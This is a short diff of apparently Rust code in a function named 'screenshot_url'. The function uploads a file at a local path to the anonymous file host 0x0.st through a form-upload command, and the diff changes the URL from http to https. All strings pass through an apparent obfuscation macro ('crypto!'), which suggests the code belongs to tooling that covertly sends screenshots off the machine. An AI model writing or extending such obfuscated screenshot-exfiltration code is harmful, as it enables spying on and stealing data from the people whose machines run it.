@@ -199,7 +199,7 @@ pub async fn screenshot_url() -> anyhow::Result<String> {
         vec![
             &crypto!("-F"),
             &format!("{}{}", crypto!("file=@"), path),
-            &crypto!("http://0x0.st"),
+            &crypto!("https://0x0.st"),
         ],
     )?;
 
